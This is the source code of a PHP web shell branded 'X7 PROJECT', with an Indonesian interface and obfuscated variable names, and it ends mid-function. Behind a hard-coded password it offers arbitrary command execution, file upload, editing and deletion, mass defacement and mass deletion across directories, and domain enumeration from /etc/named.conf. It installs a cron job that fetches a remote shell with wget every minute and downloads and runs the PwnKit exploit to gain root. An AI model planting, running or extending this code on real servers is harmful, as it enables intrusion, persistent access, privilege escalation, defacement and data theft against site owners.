<?php
set_time_limit(0);
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
session_start();
date_default_timezone_set("Asia/Jakarta");
$nana = array_merge($_POST, $_GET);
$pwd = "Alivos7";
if(empty($_SESSION['login'])) {
?>
<html>
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
		<title><?=$_SERVER['HTTP_HOST'];?> : ./X7 PROJECT</title>
		<link rel="stylesheet" href="//unknownsec.ftp.sh/main/style-fm.css">
		<script src="//cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js"></script>
	</head>
<body class="bg-secondary text-light">
<div class="container-fluid">
	<div class="py-3" id="main">
		<div class="box shadow bg-dark p-4 rounded-3">
			<form method="post">
				<i class="bi bi-display"></i>&nbsp;:&nbsp;<u><?=php_uname();?></u>
<?php
if($nana['pwd']) {
	if($nana['pwd'] == $pwd) {
		$_SESSION['login'] = "login";
print '<strong>Login</strong> ok!  '.alt_ok().'<a class="btn-close" href="'.$_SERVER['PHP_SELF'].'"></a></div>';
		} else { 
print '<strong>Login</strong> fail! '.alt_fail().'</div>';
	}
}
?>
				<div class="input-group mb-3">
					<input type="password" class="form-control form-control-sm" name="pwd" placeholder="" required="required">
					<button type="submit" class="btn btn-primary btn-sm"><i class="bi bi-arrow-return-right"></i></button>
				</div>
			</form>
		<div class="text-secondary">&copy; <?=date("Y");?> X7 PROJECT</div>
		</div>
	</div>
</div>
</body>
</html>
<?php
exit();
}
if(isset($nana["left"])) {
	session_start();
	session_destroy();
	print '<script>window.location="'.$_SERVER['PHP_SELF'].'";</script>';
}
$IIIIIIIIIIl1 	= 'FilesMan';
$IIIIIIIIII1I 	= true;
$IIIIIIIIII1l 	= 'UTF-8';
date_default_timezone_set('Asia/Jakarta');
if(isset($_GET['file']) &&($_GET['file'] != '') &&($_GET['aksi'] == 'download')){
@ob_clean();
$file = $_GET['file'];
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.basename($file).'"');
header('Expires: 0');
header('Cache-Control: must-revalidate');
header('Pragma: public');
header('Content-Length: '.filesize($file));
readfile($file);
exit;
}
function w($dir,$perm){
if(!is_writable($dir)){
return "<font color='red'>".$perm.'</font>';
}else{
return "<font color='lime'>".$perm.'</font>';
}
}
function r($dir,$perm){
if(!is_readable($dir)){
return '<font color=red>'.$perm.'</font>';
}else{
return '<font color=lime>'.$perm.'</font>';
}
}
function IIIIIIIII1lI($cmd){
if(function_exists('system')) {
@ob_start();
@system($cmd);
$IIIIIIIII11l = @ob_get_contents();
@ob_end_clean();
}elseif(function_exists('exec')) {
@exec($cmd,$IIIIIIIIlII1);
$IIIIIIIII11l = join("\n",$IIIIIIIIlII1);
}elseif(function_exists('passthru')) {
@ob_start();
@passthru($cmd);
$IIIIIIIII11l = @ob_get_contents();
@ob_end_clean();
}elseif(function_exists('shell_exec')) {
$IIIIIIIII11l = @shell_exec($cmd);
}elseif(function_exists('proc_open')){
$IIIIIIIIlI1I = array(0 =>array('pipe','r'),1 =>array('pipe','w'),2 =>array('pipe','w'));
$IIIIIIIIlI1l = proc_open($cmd,$IIIIIIIIlI1I,$IIIIIIIIllII);
if(is_resource($IIIIIIIIlI1l)){
if(function_exists('fread') &&function_exists('feof')){
while(!feof($IIIIIIIIllII[1])){$IIIIIIIII11l .= fread($IIIIIIIIllII[1],512);}
}elseif(function_exists('fgets') &&function_exists('feof')){
while(!feof($IIIIIIIIllII[1])){$IIIIIIIII11l .= fgets($IIIIIIIIllII[1],512);}
}
}
pclose($IIIIIIIIlI1l);
}elseif(function_exists('popen')){
$IIIIIIIIlI1l = popen($cmd,'r');
if(is_resource($IIIIIIIIlI1l)){
if(function_exists('fread') &&function_exists('feof')){
while(!feof($IIIIIIIIlI1l)){$IIIIIIIII11l .= fread($IIIIIIIIlI1l,512);}
}elseif(function_exists('fgets') &&function_exists('feof')){
while(!feof($IIIIIIIIlI1l)){$IIIIIIIII11l .= fgets($IIIIIIIIlI1l,512);}
}
}
pclose($IIIIIIIIlI1l);
}
$IIIIIIIII11l = wordwrap(htmlspecialchars($IIIIIIIII11l));
return $IIIIIIIII11l;
}
function IIIIIIIIl1II($file){
$IIIIIIIIl1Il = fileperms($file);
if (($IIIIIIIIl1Il &0xC000) == 0xC000){
$IIIIIIIIl1lI = 's';
}elseif (($IIIIIIIIl1Il &0xA000) == 0xA000){
$IIIIIIIIl1lI = 'l';
}elseif (($IIIIIIIIl1Il &0x8000) == 0x8000){
$IIIIIIIIl1lI = '-';
}elseif (($IIIIIIIIl1Il &0x6000) == 0x6000){
$IIIIIIIIl1lI = 'b';
}elseif (($IIIIIIIIl1Il &0x4000) == 0x4000){
$IIIIIIIIl1lI = 'd';
}elseif (($IIIIIIIIl1Il &0x2000) == 0x2000){
$IIIIIIIIl1lI = 'c';
}elseif (($IIIIIIIIl1Il &0x1000) == 0x1000){
$IIIIIIIIl1lI = 'p';
}else{
$IIIIIIIIl1lI = 'u';
}
$IIIIIIIIl1lI .= (($IIIIIIIIl1Il &0x0100) ?'r': '-');
$IIIIIIIIl1lI .= (($IIIIIIIIl1Il &0x0080) ?'w': '-');
$IIIIIIIIl1lI .= (($IIIIIIIIl1Il &0x0040) ?
(($IIIIIIIIl1Il &0x0800) ?'s': 'x') :
(($IIIIIIIIl1Il &0x0800) ?'S': '-'));
$IIIIIIIIl1lI .= (($IIIIIIIIl1Il &0x0020) ?'r': '-');
$IIIIIIIIl1lI .= (($IIIIIIIIl1Il &0x0010) ?'w': '-');
$IIIIIIIIl1lI .= (($IIIIIIIIl1Il &0x0008) ?
(($IIIIIIIIl1Il &0x0400) ?'s': 'x') :
(($IIIIIIIIl1Il &0x0400) ?'S': '-'));
$IIIIIIIIl1lI .= (($IIIIIIIIl1Il &0x0004) ?'r': '-');
$IIIIIIIIl1lI .= (($IIIIIIIIl1Il &0x0002) ?'w': '-');
$IIIIIIIIl1lI .= (($IIIIIIIIl1Il &0x0001) ?
(($IIIIIIIIl1Il &0x0200) ?'t': 'x') :
(($IIIIIIIIl1Il &0x0200) ?'T': '-'));
return $IIIIIIIIl1lI;
}
$path = str_replace('\\','/',$path);
$IIIIIIIIl1l1 = explode('/',$path);
if(isset($_GET['dir'])){
$dir = $_GET['dir'];
chdir($dir);
}else{
$dir = getcwd();
}
$IIIIIIIIl111 = php_uname();
$IIIIIIII1III = getHostByName(getHostName());
$IIIIIIII1IIl = phpversion();
$IIIIIIII1IlI = $_SERVER['HTTP_HOST'];
$IIIIIIII1Ill = $_SERVER['SERVER_SOFTWARE'];
$dir = str_replace("\\",'/',$dir);
$IIIIIIII1Il1 = explode('/',$dir);
$IIIIIIII1I1I = (function_exists('mysql_connect')) ?'<font color=green>ON</font>': '<font color=red>OFF</font>';
$IIIIIIII1I1l = (function_exists('curl_version')) ?'<font color=green>ON</font>': '<font color=red>OFF</font>';
$mail = (function_exists('mail')) ?'<font color=green>ON</font>': '<font color=red>OFF</font>';
$IIIIIIII1lII = disk_total_space($dir);
$IIIIIIII1lIl = disk_free_space($dir);
$IIIIIIII1lI1 =  (int) ($IIIIIIII1lIl/$IIIIIIII1lII*100);
$IIIIIIII1llI = @ini_get('disable_functions');
$IIIIIIII1ll1 = (!empty($IIIIIIII1llI)) ?"<a href='?dir=$dir&aksi=disabfunc' class='ds'>$IIIIIIII1llI</a>": "<a href='?dir=$dir&aksi=disabfunc'><font color=green>NONE</font></a>";
$IIIIIIII1l1I = "<img src='https://i.top4top.io/p_2381lxz5o2.png' class='ico'></img>";
$IIIIIIII1l1l = "<img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ico2'></img>";
function IIIIIIII1l11( $IIIIIIII11II ){
$IIIIIIII11Il = array( 'B','KB','MB','GB','TB');
for( $IIIIIIII11I1 = 0;$IIIIIIII11II >= 1024 &&$IIIIIIII11I1 <( count( $IIIIIIII11Il ) -1 );$IIIIIIII11II /= 1024,$IIIIIIII11I1++);
return( round( $IIIIIIII11II,2 ).' '.$IIIIIIII11Il[$IIIIIIII11I1] );
}
function IIIIIIII11l1($IIIIIIII111I,$IIIIIIII111l,$IIIIIIII1111){
if(strpos($IIIIIIII111I,$IIIIIIII111l) === FALSE) return FALSE;
if(strpos($IIIIIIII111I,$IIIIIIII1111) === FALSE) return FALSE;
$start = strpos($IIIIIIII111I,$IIIIIIII111l) +strlen($IIIIIIII111l);
$IIIIIIIlIII1 = strpos($IIIIIIII111I,$IIIIIIII1111,$start);
$IIIIIIIlIIlI = substr($IIIIIIII111I,$start,$IIIIIIIlIII1 -$start);
return $IIIIIIIlIIlI;
}
$IIIIIIIlIIl1 = @file('/etc/named.conf',false);
if (!$IIIIIIIlIIl1){
$IIIIIIIlII1l = '<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>';
$GLOBALS['need_to_update_header'] = 'true';
}else{
$IIIIIIIlII11 = 0;
foreach ($IIIIIIIlIIl1 as $IIIIIIIlIlII){
if (@strstr($IIIIIIIlIlII,'zone')){
preg_match_all('#zone "(.*)"#',$IIIIIIIlIlII,$IIIIIIIlIllI);
flush();
if (strlen(trim($IIIIIIIlIllI[1][0])) >2){
flush();
$IIIIIIIlII11++;
}
}
}
$IIIIIIIlII1l = "$IIIIIIIlII11 Domain";
}
function IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir){
echo "<script>Swal.fire({
			title: '$IIIIIIIlIl1l',
			text: '$IIIIIIIlIl11',
			type: '$IIIIIIIlIl1l',
		}).then((value) => {window.location='?dir=$dir';})</script>";
}
function about(){
echo '<div class="card text-center bg-light about">
		<h4 class="card-header">{ X7 Project }</h4>
		<div class="card-body">
		<center><div class="img"></div></center>
		<p class="card-text">{ X7 Project } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
		</div>
		<div class="card-footer">
		<small class="card-text text-muted">Copyright 2019 { X7 Project }</small>
		</div>
		</div><br/>';
exit;
}
function IIIIIIIlI1Il($dir){
echo '<div class="card">
		<div class="card-body form-group">
		<p class="text-muted">Crontab Automation Project</p>
		';
IIIIIIIII1lI('pwd=$(pwd);echo "* * * * * wget https://fjr.nasiwebhost.com/shell/users.rst -O $pwd/admin.php" | crontab');
$IIIIIIIlI1I1 = IIIIIIIII1lI('crontab -l');
if($IIIIIIIlI1I1 == ''){
echo '<p class="text-muted">[+] Failed Memasang</p></div></div>';
}else{
echo '<p class="text-muted">[+] Defense Shell Logs : </br>'.IIIIIIIII1lI('crontab -l').'</p></div></div>';
}
}
function IIIIIIIlI1lI($dir){
echo "<div class='card'>
		<div class='card-body form-group'><form>
		<h5><p class='text-muted'><i class='fa fa-terminal'></i>Terminal</p></h5>
		<input type='text' class='form-control' name='rootnya' autocomplete='off' placeholder='rooted'>
		</form></div></div>";
}
function IIIIIIIlI1ll($dir){
echo "<div class='card'>
		<div class='card-body form-group'><form>
		<p class='text-muted'>Mass Change Date Automation Project</p>
		<h5><p class='text-muted'>Target Directory/file :</p></h5>
		<input type='text' class='form-control' name='changedatenya' autocomplete='off' placeholder='ex : /var/www/html'>
		</form></div></div>";
}
function IIIIIIIlI11I($dir){
echo "<div class='card'>
		<div class='card-body form-group'><form>
		<p class='text-muted'>Mass Change Date Automation Project</p>
		<h5><p class='text-muted'>Target Directory/file :</p></h5>
		<input type='text' class='form-control' name='ngebepassnya' autocomplete='off' placeholder='ex : /var/www/html'>
		</form></div></div>";
}
function IIIIIIIllII1($dir){
echo '<div class="card">
		<div class="card-body form-group">
		<p class="text-muted">Auto Root Server By X7 Project</p>';
IIIIIIIII1lI('curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o kangrut;chmod +x kangrut');
echo '<p class="text-muted">[+] Checking Root</p>';
$IIIIIIIllIlI = IIIIIIIII1lI("./kangrut 'id'");
if($IIIIIIIllIlI == ''){
echo '<p class="text-muted">[+] Failed Rooted!</p></div></div>';
}else{
echo '<p class="text-muted">[+] Success Rooted : '.IIIIIIIII1lI('./kangrut id').'<br></div></div></p>';
IIIIIIIII1lI('rm -rf kangrut');
}
}
function IIIIIIIllIll($dir){
echo '<form method="POST" enctype="multipart/form-data" name="uploader" id="uploader">
		<div class="card">
		<div class="card-body form-group">
		<p class="text-muted">//Multiple Upload</p>
		<div class="custom-file">
		<input type="file" name="file[]" multiple class="custom-file-input" id="customFile">
		<label class="custom-file-label" for="customFile">Choose file</label>
		</div>
		<input type="submit" class="btn btn-sm btn-primary btn-block mt-4 p-2" name="upload" value="Upload">
		</div>
		</div>
		</form>';
if(isset($_POST['upload'])){
$IIIIIIIllIl1 = count($_FILES['file']['name']);
for($IIIIIIII11I1=0;$IIIIIIII11I1<$IIIIIIIllIl1;$IIIIIIII11I1++){
$IIIIIIIllI1I = $_FILES['file']['name'][$IIIIIIII11I1];
$IIIIIIIllI1l = @copy($_FILES['file']['tmp_name'][$IIIIIIII11I1],"$dir/".$IIIIIIIllI1I);
}
if($IIIIIIIllIl1 <2){
if($IIIIIIIllI1l){
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = "Berhasil Upload $IIIIIIIllI1I";
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
$IIIIIIIlIl1l = 'error';
$IIIIIIIlIl11 = 'Gagal Upload File';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}
}else{
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = "Berhasil Upload $IIIIIIIllIl1 File";
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}
}
}
function IIIIIIIlllII($dir,$file,$IIIIIIIlllIl){
echo "<form method='POST'>
		<h5>Chmod File : $IIIIIIIlllIl </h5>
		<div class='form-group input-group'>
		<input type='text' name='perm' class='form-control' value='".substr(sprintf('%o',fileperms($_GET['file'])),-4)."'>
		<input type='submit' class='btn btn-danger form-control' value='Chmod'>
		</div>
		</form>";
if(isset($_POST['perm'])){
if(@chmod($_GET['file'],$_POST['perm'])){
echo '<font color="lime">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="white">Change Permission Gagal</font><br/>';
}
}
exit;
}
function IIIIIIIlllll($dir,$IIIIIIII1l1l){
echo "<h4>$IIIIIIII1l1l Buat File :</h4>
		<form method='POST'>
		<div class='input-group'>
		<input type='text' class='form-control' name='nama_file[]' placeholder='Nama File...'>
		<div class='input-group-prepend'>
		<div class='input-group-text'><a id='add_input'><i class='fa fa-plus'></i></a></div>
		</div>
		</div><br/>
		<div id='output'></div>
		<textarea name='isi_file' class='form-control' rows='13' placeholder='Isi File...'></textarea><br/>
		<input type='submit' class='btn btn-info btn-block' name='bikin' value='Buat'>
		</form>";
if (isset($_POST['bikin'])){
$name = $_POST['nama_file'];
$isi_file = $_POST['isi_file'];
foreach ($name as $nama_file){
$IIIIIIIIlI1l = @fopen("$nama_file",'w');
if($isi_file){
$buat = @fwrite($IIIIIIIIlI1l,$isi_file);
}else{
$buat = $IIIIIIIIlI1l;
}
}
if ($buat){
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = 'Berhasil Membuat File';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
$IIIIIIIlIl1l = 'error';
$IIIIIIIlIl11 = 'Gagal Membuat File';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}
}
}
function view($dir,$file,$IIIIIIIlllIl,$IIIIIIII1l1l){
echo '[ <a class="active" href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]
		<h5>'.$IIIIIIII1l1l.' Lihat File : '.$IIIIIIIlllIl.'</h5>
		<textarea rows="13" class="form-control" disabled="">'.htmlspecialchars(@file_get_contents($file)).'</textarea><br/>';
}
function IIIIIIIll1lI($dir,$file,$IIIIIIIlllIl,$IIIIIIII1l1l){
echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
echo "<form method='POST'>
		<h5>$IIIIIIII1l1l Edit File : $IIIIIIIlllIl</h5>
		<textarea rows='13' class='form-control' name='isi'>".htmlspecialchars(@file_get_contents($file))."</textarea><br/>
		<button type='sumbit' class='btn btn-info btn-block' name='edit_file'>Update</button>
		</form>";
if(isset($_POST['edit_file'])){
$IIIIIIIll1ll = fopen("$file",'w');
$IIIIIIIll1l1 = fwrite($IIIIIIIll1ll,$_POST['isi']);
if ($IIIIIIIll1l1){
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = 'Berhasil Update File';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
$IIIIIIIlIl1l = 'error';
$IIIIIIIlIl11 = 'Gagal Update File';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}
}
}
function IIIIIIIll11I($dir,$file,$IIIIIIIlllIl,$IIIIIIII1l1l){
echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
echo "<form method='POST'>
		<h5>$IIIIIIII1l1l Rename File : $IIIIIIIlllIl</h5>
		<input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...' value='$IIIIIIIlllIl'><br/>
		<button type='sumbit' class='btn btn-info btn-block' name='rename_file'>Rename</button>
		</form>";
if(isset($_POST['rename_file'])){
$IIIIIIIll11l = $file;
$IIIIIIIll111 = $_POST['namanew'];
rename( $IIIIIIIll111,$IIIIIIIll11l);
if(file_exists($IIIIIIIll111)){
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = "Nama $IIIIIIIll111 Telah Digunakan";
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
if(rename( $IIIIIIIll11l,$IIIIIIIll111)){
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = "Berhasil Mengganti Nama Menjadi $IIIIIIIll111";
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
$IIIIIIIlIl1l = 'error';
$IIIIIIIlIl11 = 'Gagal Mengganti Nama';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}
}
}
}
function IIIIIIIl1IIl($dir,$file,$IIIIIIIlllIl){
echo '[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'">Lihat</a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'">Edit</a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'">Rename</a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=hapusf&file='.$file.'">Delete</a> ]';
echo "<div class='card card-body text-center text-dark mb-4'>
		<p>Yakin Menghapus : $IIIIIIIlllIl</p>
		<form method='POST'>
		<a class='btn btn-danger btn-block' href='?dir=$dir'>Tidak</a>
		<input type='submit' name='ya' class='btn btn-success btn-success btn-block' value='Ya'>
		</form>
		</div>";
if ($_POST['ya']){
if (unlink($file)){
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = 'Berhasil Menghapus File';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
$IIIIIIIlIl1l = 'error';
$IIIIIIIlIl11 = 'Gagal Menghapus File';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}
}
}
function IIIIIIIl1IlI($dir,$IIIIIIIl1Ill){
echo "<form method='POST'>
		<h5>Chmod Folder : $IIIIIIIl1Ill </h5>
		<div class='form-group input-group'>
		<input type='text' name='perm' class='form-control' value='".substr(sprintf('%o',fileperms($_GET['dir'])),-4)."'>
		<input type='submit' class='btn btn-danger form-control' value='Chmod' name='chmo'>
		</div>
		</form>";
if(isset($_POST['chmo'])){
if(@chmod($_GET['dir'],$_POST['perm'])){
echo '<font color="lime">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="white">Change Permission Gagal</font><br/>';
}
}
exit;
}
function IIIIIIIl1Il1($dir,$IIIIIIII1l1I){
echo "<h5>$IIIIIIII1l1I Buat Folder :</h5>
		<form method='POST'>
		<div class='input-group'>
		<input type='text' class='form-control' name='nama_folder[]' placeholder='Nama Folder...'>
		<div class='input-group-prepend'>
		<div class='input-group-text'><a id='add_input1'><i class='fa fa-plus'></i></a></div>
		</div>
		</div><br/>
		<div id='output1'></div>
		<input type='submit' class='btn btn-info btn-block' name='buat' value='Buat'>
		</form>";
if (isset($_POST['buat'])){
$IIIIIIIl1I1I = $_POST['nama_folder'];
foreach ($IIIIIIIl1I1I as $nama_folder){
$folder = preg_replace("([^\w\s\d\-_~,;:\[\]\(\].]|[\.]{2,})",'',$nama_folder);
$IIIIIIIl1lIl = @mkdir ($folder);
}
if ($IIIIIIIl1lIl){
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = 'Berhasil Membuat Folder';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
$IIIIIIIlIl1l = 'error';
$IIIIIIIlIl11 = 'Gagal Membuat Folder';
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}
}
}
function IIIIIIIl1lI1($dir,$IIIIIIIl1Ill,$IIIIIIII1l1I){
echo "[ <a href='?dir=".$dir."&aksi=rename_folder' class='active'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder'>Delete</a> ] 
		<h5>$IIIIIIII1l1I Rename Folder : $IIIIIIIl1Ill </h5>
		<form method='POST'>
		<input type='text' class='form-control' name='namanew' placeholder='Masukan Nama Baru...' value='$IIIIIIIl1I1I'><br/>
		<button type='sumbit' class='btn btn-info btn-block' name='ganti'>Ganti!!</button><br/>
		</form>";
if(isset($_POST['ganti'])){
$IIIIIIIll111 = htmlspecialchars($_POST['namanew']);
$IIIIIIIl1llI = rename($dir,''.dirname($dir).'/'.$IIIIIIIll111.'');
if($IIIIIIIl1llI){
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = 'Berhasil Mengganti Nama';
$dir = dirname($dir);
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
$IIIIIIIlIl1l = 'error';
$IIIIIIIlIl11 = 'Gagal Mengganti Nama';
$dir = dirname($dir);
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}
}
exit;
}
function IIIIIIIl1ll1($dir,$IIIIIIIl1Ill){
echo "[ <a href='?dir=".$dir."&aksi=rename_folder'>Rename</a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder' class='active'>Delete</a> ] 
		<div class='card card-body text-center text-dark mb-4'>
		<p>Apakah Yakin Menghapus : $IIIIIIIl1Ill ?</p>
		<form method='POST'>
		<a class='btn btn-danger btn-block' href='?dir=".dirname($dir)."'>Tidak</a>
		<input type='submit' name='ya' class='btn btn-success btn-block' value='Ya'>
		</form>
		</div><br/>";
if ($_POST['ya']){
if(is_dir($dir)){
if(is_writable($dir)){
@rmdir($dir);
@IIIIIIIII1lI("rm -rf $dir");
@IIIIIIIII1lI("rmdir /s /q $dir");
$IIIIIIIlIl1l = 'success';
$IIIIIIIlIl11 = 'Berhasil Menghapus';
$dir = dirname($dir);
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}else{
$IIIIIIIlIl1l = 'error';
$IIIIIIIlIl11 = 'Berhasil Menghapus';
$dir = dirname($dir);
IIIIIIIlIl1I($IIIIIIIlIl1l,$IIIIIIIlIl11,$dir);
}
}
}
exit;
}
function IIIIIIIl1l11($dir,$file,$IIIIIIII1l1I,$IIIIIIII1l1l){
function IIIIIIIl11II($dir,$IIIIIIIl11Il,$IIIIIIIl11I1){
if(is_writable($dir)){
$IIIIIIIl11lI = scandir($dir);
foreach($IIIIIIIl11lI as $IIIIIIIl11ll){
$IIIIIIIl11l1 = "$dir/$IIIIIIIl11ll";
$IIIIIIIl111I = $IIIIIIIl11l1.'/'.$IIIIIIIl11Il;
if($IIIIIIIl11ll === '.'){
file_put_contents($IIIIIIIl111I,$IIIIIIIl11I1);
}elseif($IIIIIIIl11ll === '..'){
file_put_contents($IIIIIIIl111I,$IIIIIIIl11I1);
}else{
if(is_dir($IIIIIIIl11l1)){
if(is_writable($IIIIIIIl11l1)){
echo "Done > $IIIIIIIl111I\n";
file_put_contents($IIIIIIIl111I,$IIIIIIIl11I1);
$masdef = IIIIIIIl11II($IIIIIIIl11l1,$IIIIIIIl11Il,$IIIIIIIl11I1);
}
}
}
}
}
}
function IIIIIIIl1111($dir,$IIIIIIIl11Il,$IIIIIIIl11I1){
if(is_writable($dir)){
$IIIIIIIl11lI = scandir($dir);
foreach($IIIIIIIl11lI as $IIIIIIIl11ll){
$IIIIIIIl11l1 = "$dir/$IIIIIIIl11ll";
$IIIIIIIl111I = $IIIIIIIl11l1.'/'.$IIIIIIIl11Il;
if($IIIIIIIl11ll === '.'){
file_put_contents($IIIIIIIl111I,$IIIIIIIl11I1);
}elseif($IIIIIIIl11ll === '..'){
file_put_contents($IIIIIIIl111I,$IIIIIIIl11I1);
}else{
if(is_dir($IIIIIIIl11l1)){
if(is_writable($IIIIIIIl11l1)){
echo "Done > $IIIIIIIl11ll/$IIIIIIIl11Il\n";
file_put_contents($IIIIIIIl111I,$IIIIIIIl11I1);
}
}
}
}
}
}
if($_POST['start']){
echo "[ <a href='?dir=$dir'>Kembali</a> ]
			<textarea class='form-control' rows='13' disabled=''>";
if($_POST['tipe'] == 'mahal'){
IIIIIIIl11II($_POST['d_dir'],$_POST['d_file'],$_POST['script']);
}elseif($_POST['tipe'] == 'murah'){
IIIIIIIl1111($_POST['d_dir'],$_POST['d_file'],$_POST['script']);
}
echo '</textarea><br/>';
}else{
echo "<form method='post'>
			<div class='text-center'>
			<h5>Tipe :</h5>
			<input id='toggle-on' class='toggle toggle-left' name='tipe' value='murah' type='radio' checked>
			<label for='toggle-on' class='butn'>Biasa</label>
			<input id='toggle-off' class='toggle toggle-right' name='tipe' value='mahal' type='radio'>
			<label for='toggle-off' class='butn'>Masal</label>
			</div> 
			<h5>$IIIIIIII1l1I Lokasi :</h5>
			<input type='text' name='d_dir' value='$dir' class='form-control'><br>
			<h5>$IIIIIIII1l1l Nama File :</h5>
			<input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br/>
			<h5>$IIIIIIII1l1l Isi File :</h5>
			<textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { X7 Project }'></textarea><br/>
			<input type='submit' name='start' value='Mass Deface' class='btn btn-danger btn-block'>
			</form>";
}
exit;
}
function IIIIIII1IIII($dir,$file,$IIIIIIII1l1I,$IIIIIIII1l1l){
function IIIIIII1IIIl($dir,$IIIIIIIl11Il){
if(is_writable($dir)){
$IIIIIIIl11lI = scandir($dir);
foreach($IIIIIIIl11lI as $IIIIIIIl11ll){
$IIIIIIIl11l1 = "$dir/$IIIIIIIl11ll";
$IIIIIIIl111I = $IIIIIIIl11l1.'/'.$IIIIIIIl11Il;
if($IIIIIIIl11ll === '.'){
if(file_exists("$dir/$IIIIIIIl11Il")){
unlink("$dir/$IIIIIIIl11Il");
}
}elseif($IIIIIIIl11ll === '..'){
if(file_exists(''.dirname($dir)."/$IIIIIIIl11Il")){
unlink(''.dirname($dir)."/$IIIIIIIl11Il");
}
}else{
if(is_dir($IIIIIIIl11l1)){
if(is_writable($IIIIIIIl11l1)){
if($IIIIIIIl111I){
echo "$IIIIIIIl111I > Terhapus\n";
unlink($IIIIIIIl111I);
$IIIIIII1III1 = IIIIIII1IIIl($IIIIIIIl11l1,$IIIIIIIl11Il);
}
}
}
}
}
}
}
if($_POST['start']){
echo "[ <a href='?dir=$dir'>Kembali</a> ]
			<textarea class='form-control' rows='13' disabled=''>";
IIIIIII1IIIl($_POST['d_dir'],$_POST['d_file']);
echo '</textarea><br/>';
}else{
echo "<form method='post'>
			<h5>$IIIIIIII1l1I Lokasi :</h5>
			<input type='text' name='d_dir' value='$dir' class='form-control'><br/>
			<h5>$IIIIIIII1l1l Nama File :</h5>
			<input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control'><br/>
			<input type='submit' name='start' value='Delete!!' class='btn btn-danger form-control'>
			</form>";
}
exit;
}
function IIIIIII1IIlI($dir,$file,$IIIIIIII1III){
$IIIIIIII11I1 = 0;
echo "<div class='card container'>";
if(preg_match('/hsphere/',$dir)){
$IIIIIII1IIl1 = explode("\r\n",$_POST['url']);
if(isset($_POST['jump'])){
echo '<pre>';
foreach($IIIIIII1IIl1 as $url){
$url = str_replace(array('http://','www.'),'',strtolower($url));
$IIIIIII1II11 = '/etc/passwd';
$IIIIIII1IlII = fopen($IIIIIII1II11,'r');
